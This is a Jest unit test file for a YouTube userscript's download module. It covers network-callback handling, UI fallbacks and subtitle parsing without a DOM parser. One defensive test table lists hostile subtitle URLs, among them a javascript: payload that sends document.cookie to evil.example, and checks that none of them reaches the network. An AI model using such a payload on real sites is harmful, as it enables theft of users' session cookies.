/**
 * Unit tests for the download module's degraded-environment guards: the GM
 * transport callback contract, the queue manager panel without translations
 * or SafeHTML, subtitle sources that must never reach the transport and the
 * XML scanners that run when the DOM parser is unavailable.
 */

describe('Download degraded-environment guards', () => {
  const createLogger = () => ({
    error: jest.fn(),
    warn: jest.fn(),
    info: jest.fn(),
    debug: jest.fn(),
  });

  /**
   * @param {(utils: Record<string, any>) => void} [mutateUtils] applied before
   *   the module captures its dependency surface.
   */
  function installModule(mutateUtils) {
    jest.resetModules();
    if (mutateUtils) mutateUtils(window.YouTubeUtils);
    require('../src/download.js');
    return window.YouTubePlusDownload;
  }

  beforeEach(() => {
    document.body.innerHTML = '';
    jest.resetModules();
    require('../src/utils.js');
    const canonUtils = window.YouTubeUtils;
    window._ytplusCreateHTML = s => s;
    /** @type {Map<string, string>} */
    const store = new Map();
    Object.defineProperty(window, 'YouTubeUtils', {
      configurable: true,
      writable: true,
      value: {
        $: jest.fn(sel => document.querySelector(sel)),
        $$: jest.fn(sel => Array.from(document.querySelectorAll(sel))),
        byId: jest.fn(id => document.getElementById(id)),
        getVideoIdFromUrl: canonUtils.getVideoIdFromUrl,
        getVideoIdFromLocation: jest.fn(canonUtils.getVideoIdFromLocation),
        t: jest.fn(key => key || ''),
        setSafeHTML: jest.fn((el, html) => {
          el.innerHTML = html;
        }),
        createVisibilityAwareInterval: jest.fn((cb, delay) => {
          const id = setInterval(cb, delay);
          return {
            active: true,
            stop: () => clearInterval(id),
            pause: () => clearInterval(id),
            resume: jest.fn(),
          };
        }),
        cleanupManager: {
          register: jest.fn(),
          registerInterval: jest.fn(id => id),
          registerTimeout: jest.fn(id => id),
          registerObserver: jest.fn(obs => obs),
          registerListener: jest.fn((target, event, fn, opts) => {
            target.addEventListener(event, fn, opts);
            return Symbol('listener');
          }),
          cleanup: jest.fn(),
          registerAnimationFrame: jest.fn(id => id),
        },
        NotificationManager: { show: jest.fn(), hide: jest.fn() },
        StyleManager: { add: jest.fn(), remove: jest.fn(), clear: jest.fn() },
        logError: jest.fn(),
        createElement: jest.fn(tag => document.createElement(tag)),
        loadFeatureEnabled: jest.fn(() => true),
        storage: {
          get: jest.fn(),
          set: jest.fn(),
          remove: jest.fn(),
          // Stateful so the download history really round-trips.
          getItem: jest.fn(key => store.get(key) ?? null),
          setItem: jest.fn((key, value) => {
            store.set(key, value);
          }),
        },
        logger: { debug: jest.fn(), info: jest.fn(), warn: jest.fn(), error: jest.fn() },
        SETTINGS_KEY: 'youtube_plus_settings',
        isWatchRoute: jest.fn(() => window.location.pathname === '/watch'),
        isShortsRoute: jest.fn(() => false),
        isYouTubeDomain: jest.fn(() => true),
        isChannelRoute: jest.fn(() => false),
        isSettingsModalOpen: jest.fn(() => false),
        createIsRelevantRoute: () => () => true,
        createWithErrorBoundary: _name => fn => fn,
        logSuppressed: jest.fn(),
        getRoute: jest.fn(() => 'watch'),
      },
    });
    Object.defineProperty(window, 'YouTubePlusI18n', {
      configurable: true,
      writable: true,
      value: {
        t: jest.fn(key => key),
        getLanguage: jest.fn(() => 'en'),
        loadTranslations: jest.fn(),
        isReady: jest.fn(() => true),
      },
    });
    Object.defineProperty(window, 'YouTubePlusLogger', {
      configurable: true,
      writable: true,
      value: {
        error: jest.fn(),
        warn: jest.fn(),
        info: jest.fn(),
        debug: jest.fn(),
        createLogger: jest.fn(() => createLogger()),
        setLevel: jest.fn(),
        getLevel: jest.fn(() => 'info'),
        getRecent: jest.fn(() => []),
        export: jest.fn(),
        createChild: jest.fn(),
      },
    });
    Object.defineProperty(window, 'YouTubePlusDOMCache', {
      configurable: true,
      writable: true,
      value: {
        get: jest.fn(),
        querySelector: jest.fn(),
        getAll: jest.fn(),
        querySelectorAll: jest.fn(),
        getElementById: jest.fn(),
        waitForElement: jest.fn(),
        invalidate: jest.fn(),
        clear: jest.fn(),
      },
    });

    global.mockLocation({
      href: 'https://www.youtube.com/watch?v=test12345ab',
      hostname: 'www.youtube.com',
      pathname: '/watch',
      search: '?v=test12345ab',
    });

    global.fetch = jest.fn(() => Promise.reject(new Error('network disabled in unit tests')));
    Object.defineProperty(URL, 'createObjectURL', {
      configurable: true,
      writable: true,
      value: jest.fn(() => 'blob:guards-test'),
    });
    jest.spyOn(HTMLAnchorElement.prototype, 'click').mockImplementation(() => undefined);
  });

  /** Capture every blob body the module saves through the download anchor. */
  function captureDownloadedText() {
    const OriginalBlob = window.Blob;
    /** @type {string[]} */
    const contents = [];
    window.Blob = jest.fn(function (parts, opts) {
      if (typeof parts?.[0] === 'string') contents.push(parts[0]);
      const blob = new OriginalBlob(parts, opts);
      if (typeof blob.text !== 'function') {
        blob.text = () => Promise.resolve(typeof parts?.[0] === 'string' ? parts[0] : '');
      }
      return blob;
    });
    return contents;
  }

  /**
   * Serve the whole cnv.cx ladder (key, conversion, CDN blob) so a queued
   * download reaches its completed state.
   * @returns {string[]} every requested URL, in order
   */
  function serveConversion() {
    /** @type {string[]} */
    const urls = [];
    GM_xmlhttpRequest.mockImplementation(options => {
      const url = String(options.url || '');
      urls.push(url);
      if (url.includes('/sanity/key')) {
        options.onload({ status: 200, responseText: JSON.stringify({ key: 'k' }) });
        return { abort: jest.fn() };
      }
      if (url.includes('/converter')) {
        options.onload({
          status: 200,
          responseText: JSON.stringify({ url: 'https://cdn.example.com/f.mp4' }),
        });
        return { abort: jest.fn() };
      }
      options.onload({ status: 200, response: new window.Blob(['binary payload']) });
      return { abort: jest.fn() };
    });
    return urls;
  }

  describe('GM transport callback contract', () => {
    test('a caller onload callback sees the response before the promise resolves', async () => {
      const onload = jest.fn();
      GM_xmlhttpRequest.mockImplementation(options => {
        options.onload({ status: 200, responseText: 'payload' });
        return { abort: jest.fn() };
      });
      const api = installModule();

      const response = await api.gmXmlHttpRequest({
        url: 'https://callbacks.test/load',
        onload,
      });

      expect(response.status).toBe(200);
      expect(response.responseText).toBe('payload');
      expect(onload).toHaveBeenCalledWith(expect.objectContaining({ status: 200 }));
    });

    test('a caller onerror callback sees the transport failure', async () => {
      const onerror = jest.fn();
      GM_xmlhttpRequest.mockImplementation(options => {
        options.onerror(new Error('transport exploded'));
        return { abort: jest.fn() };
      });
      const api = installModule();

      await expect(
        api.gmXmlHttpRequest({ url: 'https://callbacks.test/error', onerror })
      ).rejects.toThrow('transport exploded');
      expect(onerror).toHaveBeenCalled();
    });

    test('a caller ontimeout callback runs and the request rejects with TimeoutError', async () => {
      const ontimeout = jest.fn();
      GM_xmlhttpRequest.mockImplementation(options => {
        options.ontimeout();
        return { abort: jest.fn() };
      });
      const api = installModule();

      await expect(
        api.gmXmlHttpRequest({ url: 'https://callbacks.test/timeout', ontimeout })
      ).rejects.toMatchObject({ name: 'TimeoutError' });
      expect(ontimeout).toHaveBeenCalled();
    });

    test('the fetch fallback reports the failure through the caller onerror callback', async () => {
      const saved = Object.getOwnPropertyDescriptor(globalThis, 'GM_xmlhttpRequest');
      delete globalThis.GM_xmlhttpRequest;
      const onerror = jest.fn();
      global.fetch = jest.fn(() => Promise.reject(new Error('network down')));
      try {
        const api = installModule();
        await expect(
          api.gmXmlHttpRequest({ url: 'https://callbacks.test/fetch', onerror })
        ).rejects.toThrow('network down');
        expect(onerror).toHaveBeenCalled();
      } finally {
        if (saved) Object.defineProperty(globalThis, 'GM_xmlhttpRequest', saved);
      }
    });
  });

  describe('queue manager panel without translations or SafeHTML', () => {
    /** Emulate an engine with no translations and no SafeHTML helper. */
    const stripEnvironment = utils => {
      utils.t = jest.fn(() => '');
      delete utils.setSafeHTML;
    };

    test('the panel falls back to built-in English labels and plain glyphs', async () => {
      serveConversion();
      const api = installModule(stripEnvironment);

      await api.enqueueDownload({ format: 'video', quality: '720' });

      expect(document.querySelector('.yp-download-manager')?.getAttribute('aria-label')).toBe(
        'Downloads'
      );
      const historyBtn = document.querySelector('.yp-download-manager-history-btn');
      expect(historyBtn?.getAttribute('aria-label')).toBe('History');
      expect(historyBtn?.textContent).toBe('🕒');
      const closeBtn = document.querySelector('.yp-download-manager-close');
      expect(closeBtn?.getAttribute('aria-label')).toBe('Close');
      expect(closeBtn?.textContent).toBe('×');
      expect(document.querySelector('.badge-video')?.textContent).toBe('VIDEO');
      expect(document.querySelector('.yp-download-manager-item-info')?.textContent).toContain(
        'Completed'
      );

      // A finished item loses its cancel button (no SafeHTML to draw the
      // success icon with) and shows up in the history sub-panel.
      expect(document.querySelector('.yp-download-manager-item-cancel')).toBeNull();
      expect(
        document.querySelector('.yp-download-manager-item')?.classList.contains('completed')
      ).toBe(true);

      historyBtn?.click();
      expect(document.querySelector('.yp-download-manager-history-title')?.textContent).toBe(
        'Recent downloads'
      );
      expect(document.querySelector('.yp-download-manager-history-empty')).toBeNull();
      expect(
        document.querySelector('.yp-download-manager-history-status.status-completed')?.textContent
      ).toBe('completed');
      expect(document.querySelector('.yp-download-manager-history-name')?.textContent).toBe(
        'video'
      );
    });

    test('the item cancel control falls back to a plain glyph while the transfer runs', async () => {
      GM_xmlhttpRequest.mockImplementation(options => {
        const url = String(options.url || '');
        if (url.includes('/sanity/key')) {
          options.onload({ status: 200, responseText: JSON.stringify({ key: 'k' }) });
          return { abort: jest.fn() };
        }
        if (url.includes('/converter')) {
          options.onload({
            status: 200,
            responseText: JSON.stringify({ url: 'https://cdn.example.com/f.mp4' }),
          });
          return { abort: jest.fn() };
        }
        // The media transfer never settles: the item stays active.
        return { abort: jest.fn() };
      });
      const api = installModule(stripEnvironment);

      const queued = api.enqueueDownload({ format: 'video', quality: '720' });
      queued.catch(() => undefined);
      await new Promise(resolve => setTimeout(resolve, 20));

      const cancelBtn = document.querySelector('.yp-download-manager-item-cancel');
      expect(cancelBtn?.getAttribute('aria-label')).toBe('Cancel');
      expect(cancelBtn?.getAttribute('title')).toBe('Cancel');
      expect(cancelBtn?.textContent).toBe('×');
      expect(document.querySelector('.yp-download-manager-counter')?.textContent).toBe('1');
    });

    test('a storage write failure keeps the panel usable and shows the empty history', async () => {
      serveConversion();
      const api = installModule(utils => {
        stripEnvironment(utils);
        utils.storage.setItem = jest.fn(() => {
          throw new Error('quota exceeded');
        });
      });

      await expect(api.enqueueDownload({ format: 'video' })).resolves.toBeUndefined();

      document.querySelector('.yp-download-manager-history-btn')?.click();
      expect(document.querySelector('.yp-download-manager-history-empty')?.textContent).toBe(
        'No recent downloads'
      );
    });

    test('an audio item is badged AUDIO', async () => {
      serveConversion();
      const api = installModule(stripEnvironment);

      await api.enqueueDownload({ format: 'audio', audioBitrate: '128', embedThumbnail: false });

      expect(document.querySelector('.badge-audio')?.textContent).toBe('AUDIO');
      expect(document.querySelector('.badge-quality')?.textContent).toBe('128 kbps');
    });

    test('a storage failure never breaks the finished download', async () => {
      serveConversion();
      const api = installModule(utils => {
        utils.storage.getItem = jest.fn(() => {
          throw new Error('storage unavailable');
        });
      });

      await expect(api.enqueueDownload({ format: 'video' })).resolves.toBeUndefined();
      expect(window.YouTubeUtils.logSuppressed).toHaveBeenCalled();
    });
  });

  describe('subtitle sources that must never reach the transport', () => {
    /**
     * @param {string} body
     * @returns {string[]} every requested URL, in order
     */
    function serveSubtitles(body) {
      /** @type {string[]} */
      const urls = [];
      GM_xmlhttpRequest.mockImplementation(options => {
        const url = String(options.url || '');
        urls.push(url);
        options.onload({ status: 200, responseText: body });
        return { abort: jest.fn() };
      });
      return urls;
    }

    test.each([
      ['a relative path', '/api/timedtext'],
      ['a relative path with a query', '/api/timedtext?lang=en&fmt=srv1'],
      ['a relative path with a fragment', '/api/timedtext?lang=en&fmt#track'],
      ['a relative path with a valueless pair', '/api/timedtext?asr&lang=en'],
      ['a protocol-relative URL', '//evil.example/api/timedtext?v=relHost1&lang=en'],
      ['a javascript: URL', 'javascript:fetch("//evil.example?steal="+document.cookie)'],
      ['a data: URL', 'data:text/xml,<transcript><text start="0" dur="1">x</text></transcript>'],
    ])('%s never produces a non-http(s) request', async (_label, url) => {
      const contents = captureDownloadedText();
      const urls = serveSubtitles(
        '<transcript><text start="1" dur="2">direct cue</text></transcript>'
      );
      const api = installModule();

      await api.downloadSubtitle({
        videoId: 'relSource',
        url,
        languageCode: 'en',
        format: 'srt',
      });

      expect(contents.join('\n')).toContain('direct cue');
      expect(urls.length).toBeGreaterThan(0);
      urls.forEach(requested => {
        expect(requested.startsWith('https://www.youtube.com/api/timedtext')).toBe(true);
      });
    });
  });

  describe('subtitle XML scanners without a working DOM parser', () => {
    /**
     * @param {string} body
     * @returns {string[]} saved blob bodies
     */
    function serveSubtitles(body) {
      const contents = captureDownloadedText();
      GM_xmlhttpRequest.mockImplementation(options => {
        options.onload({ status: 200, responseText: body });
        return { abort: jest.fn() };
      });
      return contents;
    }

    test('a throwing DOMParser degrades to the regex scanners', async () => {
      const contents = serveSubtitles(
        '<transcript><text start="1" dur="2"><![CDATA[scanner & cue]]></text></transcript>'
      );
      const realParser = window.DOMParser;
      window.DOMParser = jest.fn(() => {
        throw new Error('parser unavailable');
      });
      try {
        const api = installModule();
        await api.downloadSubtitle({
          videoId: 'noParser1',
          url: 'https://www.youtube.com/api/timedtext?v=noParser1&lang=en',
          languageCode: 'en',
          format: 'txt',
        });
      } finally {
        window.DOMParser = realParser;
      }

      expect(contents.join('\n')).toContain('scanner & cue');
      expect(window.YouTubeUtils.logSuppressed).toHaveBeenCalled();
    });

    test('a missing DOMParser function degrades to the regex scanners', async () => {
      const contents = serveSubtitles(
        '<transcript><p t="3000" d="1000">paragraph cue</p></transcript>'
      );
      const realParser = window.DOMParser;
      delete window.DOMParser;
      try {
        const api = installModule();
        await api.downloadSubtitle({
          videoId: 'noParser2',
          url: 'https://www.youtube.com/api/timedtext?v=noParser2&lang=en',
          languageCode: 'en',
          format: 'txt',
        });
      } finally {
        window.DOMParser = realParser;
      }

      expect(contents.join('\n')).toContain('paragraph cue');
    });

    test('empty text and paragraph elements are skipped by both scanners', async () => {
      const contents = serveSubtitles(
        '<transcript><p><text start="1" dur="1">   </text>' +
          '<p t="2000" d="1000"></p>' +
          '<p t="4000" d="1000">kept cue</p></transcript>'
      );
      const api = installModule();

      await api.downloadSubtitle({
        videoId: 'emptyCues',
        url: 'https://www.youtube.com/api/timedtext?v=emptyCues&lang=en',
        languageCode: 'en',
        format: 'txt',
      });

      const out = contents.join('\n');
      expect(out).toContain('kept cue');
      expect(out.match(/kept cue/g)).toHaveLength(1);
    });
  });
});
